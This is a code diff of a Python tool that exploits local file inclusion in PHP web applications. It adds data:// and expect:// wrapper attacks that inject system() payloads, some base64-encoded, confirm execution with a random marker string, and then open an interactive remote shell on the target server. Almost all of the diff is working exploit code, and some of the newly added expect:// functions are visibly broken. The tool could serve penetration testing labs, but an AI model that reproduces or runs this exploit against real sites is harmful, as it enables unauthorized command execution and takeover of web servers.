@@ -5,6 +5,7 @@ import time
 import requests
 import urllib.parse as urlparse
 import base64
+from random import randint
 from termcolor import colored
 
     # def sanitation_bypass_url_encode(self):
@@ -64,7 +65,7 @@ def correctUrl(url): # ex: 'http://127.0.0.1/lfi.php?file=/etc/passwd' --> 'http
 		return url
 	eq = SubstrIndexes(url,"=")
 	if(len(eq) == 0):
-		print "\n[ERROR] Invalid URL syntax!\n"
+		print ("\n[ERROR] Invalid URL syntax!\n")
 		sys.exit()
 	last = eq[len(eq)-1]
 
@@ -91,6 +92,13 @@ def SubstrIndexes(resp, toFind):
 
     return indexes
 
+def generateRandom():
+    return "RHVuZ0h1eQ%s" %randint(40,999999)
+
+def exit():
+    print ("\nSee you!\n")
+    sys.exit(0)
+
 # SCANNER
 class Scanner:
     """Sends payload via a GET request for scanning"""
@@ -110,7 +118,6 @@ class Scanner:
         Finds the payload injection points in the URL
         """
         try:
-
             for parameter in self.parameters:
                 name = parameter.split("=")[0]
                 #value = parameter.split("=")[1]
@@ -175,7 +182,7 @@ class Scanner:
 
         for i in range(0, len(self.payload_list)):
             para[self.key[0]] = self.payload_list[i]
-            r = requests.get(url_not_para, params = para, headers=self.gen_headers)
+            r = requests.get(url_not_para, params = para, headers=self.gen_headers, verify=False)
 
 #---------------------------------------------------------------------------------
 
@@ -256,7 +263,7 @@ class Exploiters:
                 if(decode == "y" or decode == "Y" or decode == "yes"):
                     decoded = base64.b64decode(found)
                     print ("\n\n--Decoded text-----------------------------------------------------------------------------------------------------------\n")
-                    print ("%s" %decoded)
+                    print ("%s" %decoded.decode("utf-8"))
                     print ("\n-------------------------------------------------------------------------------------------------------------------------\n")
 
             print ("")
@@ -312,7 +319,7 @@ class Exploiters:
 
         if(len(getIndexes) == 0):
             return
-        if("system() has been disabled for security reasons in" in resp):
+        if("system() has been disabled for security reasons in" in resp or "Pentest" not in resp):
             phpcmd = True
 
         print ("\n[+] The website seems to be vulnerable. Opening a Shell..")
@@ -332,8 +339,8 @@ class Exploiters:
                 pwd = cleanOutput(self.extract_phpinput_resq(self.send_phpinput_cmd("cd",inputurl)), True)
         else:
             print (colored("[system() calls have been disabled by the website, you can just run php commands (ex: fwrite(fopen('a.txt','w'),\"content\");]\n","red"))
-            whoami = isUnknown(cleanOutput(self.extract_phpinput_resq(self.send_phpinput_cmd("php://get_current_user();",inputurl)), True))
-            pwd = isUnknown(cleanOutput(self.extract_phpinput_resq(self.send_phpinput_cmd("php://getcwd();",inputurl)), True))
+            whoami = isUnknown(cleanOutput(self.extract_phpinput_resq(self.send_phpinput_cmd("php://echo get_current_user();",inputurl)), True))
+            pwd = isUnknown(cleanOutput(self.extract_phpinput_resq(self.send_phpinput_cmd("php://echo getcwd();",inputurl)), True))
 
         time.sleep(1)
         domain = getDomainFromUrl(inputurl)
@@ -365,12 +372,14 @@ class Exploiters:
         return self.send_data_cmd_generic("%sdata://,%s" %(dataUrl, cmd))
 
     def send_data_cmd_b64_nosl(self, cmd, dataUrl):
-        enc = base64.b64encode(cmd)
+        cmd_as_bytes = str.encode(cmd)
+        enc = base64.b64encode(cmd_as_bytes)
         #print "requested URL: %sdata:,%s" %(url,enc)
         return self.send_data_cmd_generic("%sdata:text/plain;base64,%s" %(dataUrl,enc))
 
     def send_data_cmd_b64_sl(self, cmd, dataUrl):
-        enc = base64.b64encode(cmd)
+        cmd_as_bytes = str.encode(cmd)
+        enc = base64.b64encode(cmd_as_bytes)
         #print "requested URL: %sdata://text/plain;base64,%s" %(url,enc)
         return self.send_data_cmd_generic("%sdata://text/plain;base64,%s" %(dataUrl,enc))
 
@@ -384,11 +393,11 @@ class Exploiters:
         else:
             return self.send_data_cmd_b64_sl(cmd, dataUrl)
 
-    def extract_data_res(self, resp):
-        return self.extract_phpinput_res(resp)
+    def extract_data_resq(self, resp):
+        return self.extract_phpinput_resq(resp)
 
     def cleanDataCmd(self, cmd):
-        newcmd = "AbracadabrA ** <?php "
+        newcmd = "RHVuZ0h1eQ ** <?php "
 
         if(cmd[:6] != "php://"):
             cmds = cmd.split('&')
@@ -406,7 +415,7 @@ class Exploiters:
     def run_data(self, os):
 
         dataurl = correctUrl(self.url)
-        dataurl = checkHttp(odataurl)
+        dataurl = checkHttp(dataurl)
         rand_str = generateRandom()
         cmd = "<?php system(\"echo %s\");?>" %rand_str
         found = 0
@@ -416,7 +425,7 @@ class Exploiters:
             content = self.send_data_cmd_default(cmd, dataurl, i)
             if "wrapper is disabled" in content or "no suitable wrapper could be found" in content or "Unable to find the wrapper" in content:
                 return
-            if("system() has been disabled for security reasons" in content):
+            if("system() has been disabled for security reasons" in content or rand_str not in content):
                 sys_disabled = True
                 break
 
@@ -442,49 +451,88 @@ class Exploiters:
 
         #print "found = %s" %found
         if(found != 0):
-            print "\n[+] The website seems to be vulnerable. Opening a Shell.."
+            print ("\n[+] The website seems to be vulnerable. Opening a Shell..")
             if(sys_disabled):
-                onlyPhpPrint()
+                print (colored("[system() calls have been disabled by the website, you can just run php commands (ex: fwrite(fopen('a.txt','w'),\"content\");]\n","red"))
             else:
-                print colored("[If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),\"content\");]\n","red")
+                print (colored("[If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),\"content\");]\n","red"))
             time.sleep(1)
 
-            inputmain = removeHttpFromWebsite(extractWebsiteFromUrl(odataurl))
+            domain = getDomainFromUrl(dataurl)
             whoami = ""
             pwd = ""
 
             if(sys_disabled is False):
-                whoami = cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd("whoami"), odataurl, found)), True)
-                pwd = isUnknown(cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd("pwd"), odataurl, found)), True))
+                whoami = cleanOutput(self.extract_data_resq(self.send_data_cmd_default(self.cleanDataCmd("whoami"), dataurl, found)), True)
+                pwd = isUnknown(cleanOutput(self.extract_data_resq(self.send_data_cmd_default(self.cleanDataCmd("pwd"), dataurl, found)), True))
                 if(pwd == "?"):
-                    path = cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd("path"), odataurl, found)), True)
-                    if(checkIfWindows(path)):
+                    path = cleanOutput(self.extract_data_resq(self.send_data_cmd_default(self.cleanDataCmd("path"), dataurl, found)), True)
+                    if(checkIfWindows(path, os)):
                         os = "Windows"
-                        pwd = isUnknown(cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd("cd"), odataurl, found)), True))
+                        pwd = isUnknown(cleanOutput(self.extract_data_resq(self.send_data_cmd_default(self.cleanDataCmd("cd"), dataurl, found)), True))
             else:
-                whoami = cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd("php://get_current_user();"), odataurl, found)), True)
+                whoami = cleanOutput(self.extract_data_resq(self.send_data_cmd_default(self.cleanDataCmd("php://echo get_current_user();"), dataurl, found)), True)
                 whoami = isUnknown(whoami)
-                pwd = isUnknown(cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd("php://getcwd();"), odataurl, found)), True))
+                pwd = isUnknown(cleanOutput(self.extract_data_resq(self.send_data_cmd_default(self.cleanDataCmd("php://echo getcwd();"), dataurl, found)), True))
 
             while(cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit"):
                 if(sys_disabled):
-                    cmd = raw_input("%s@%s:%s$ PHP:// " %(whoami,inputmain,pwd))
+                    cmd = input("%s@%s:%s$ PHP:// " %(whoami,domain,pwd))
                     if(cmd[:6] != "php://"):
-					cmd = "php://%s" %cmd
+                        cmd = "php://%s" %cmd
                 else:
-					cmd = raw_input("%s@%s:%s$ " %(whoami,inputmain,pwd))
+                    cmd = input("%s@%s:%s$ " %(whoami,domain,pwd))
                 cmd = cmd.replace("\"","'")
                 if(cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit"):
-					    cmd = cleanDataCmd(cmd)
-					    print "%s\n" %cleanOutput(extract_data_res(send_data_cmd_default(cmd,odataurl,found)), False)
-			exit()
+                        cmd = self.cleanDataCmd(cmd)
+                        print ("%s\n" %cleanOutput(self.extract_data_resq(self.send_data_cmd_default(cmd,dataurl,found)), False))
+            exit()
+    #-----------------------------------------------------------------------------#
+    # expect://
 
-#-----------------------------------------------------------------------------
-def php_expect():
-    pass
+    def send_expect_cmd(cmd,url):
+        newurl = "%sexpect://%s" %(url,cmd)
+        content = (requests.get(newurl,headers=gen_headers,timeout=15, verify=False)).text
+        return content
 
-def php_zip():
-    pass
+    def extract_expect_resq(resp):
+        return extract_phpinput_resq(resp)
+
+    def run_expect():
+
+        expecturl = correctUrl(expecturl)
+        expecturl = checkHttp(expecturl)
+
+        rand_str = generateRandom()
+        cmd = "echo %s" %rand_str
+        content = send_expect_cmd(cmd, expecturl)
+        indexes = SubstrIndexes(content, rand_str)
+        found = len(indexes) > 0
+
+        if(found and ("echo %s" %rand_str) not in content and "Unable to find the wrapper &quot;expect&quot;" not in content and "wrapper is disabled" not in content and ("echo%%20%s" %rand_str) not in content):
+            print ("\n[+] The website seems to be vulnerable. Opening a System Shell..\n")
+            time.sleep(1)
+
+            domain = getDomainFromUrl(expecturl)
+            whoami = cleanOutput(extract_expect_resq(send_expect_cmd("whoami", expecturl)), True)
+            pwd = isUnknown(cleanOutput(extract_expect_resq(send_expect_cmd("pwd", expecturl)), True))
+            if(pwd == "?"):
+                path = cleanOutput(extract_expect_resq(send_expect_cmd("path", expecturl)), True)
+                if(checkIfWindows(path)):
+                    victimOs = "Windows"
+                    pwd = isUnknown(cleanOutput(extract_expect_resq(send_expect_cmd("cd", expecturl)), True))
+
+            while(cmd != "exit" and cmd != "quit"):
+                cmd = input("%s@%s:%s$ " %(whoami,domain,pwd))
+                if(cmd != "exit" and cmd != "quit"):
+                    cmd = "RHVuZ0h1eQ ** %s **" %cmd
+                    print (cleanOutput(extract_expect_resq(send_expect_cmd(cmd,expecturl)), False))
+            exit()
+    #-----------------------------------------------------------------------------#
+    # php://zip
+
+    def php_zip():
+        pass
 
 
 # REQUEST
@@ -522,8 +570,7 @@ class TestConnect:
 
 
 def main():
-
-    url = 'https://www.uitpentest.tk/login'
+    url = input("\n[*] Enter url (ex: http://127.0.0.1/dvwa/) -> ")
     php = True
     os = 'linux'
     key = []
@@ -554,12 +601,11 @@ def main():
         print("Frag:\t" + str(url_parameters.fragment))
         if url_parameters.query:
             if url_parameters.query != "":
-                temp = url_parameters.query
-                temp = temp.split("&")
-                print("Target has " + str(len(temp)) + " injectable GET parameters to test.")
-                for x in range(0, len(temp)):
-                    parameters.append(temp[x])
-                    print("GET parameter " + str(x + 1) + ": \t" + temp[x])
+                queryString = url_parameters.query
+                parameters = queryString.split("&")
+                print("Target has " + str(len(parameters)) + " injectable GET parameters to test.")
+                for x in range(0, len(parameters)):
+                    print("GET parameter " + str(x + 1) + ": \t" + parameters[x])
 
 				# Scanner
                 scanner_payloads = Scanner(url, key, payload_list, null_byte, gen_headers, parameters, os)
@@ -569,7 +615,9 @@ def main():
                 exploiters_payloads = Exploiters(url, gen_headers)
                 #exploiters_payloads.run_phpfilter()
                 # PHP Input
-                exploiters_payloads.run_phpinput(os)
+                #exploiters_payloads.run_phpinput(os)
+				# Data
+                exploiters_payloads.run_data(os)
         else:
             print("No GET parameters")
     else:
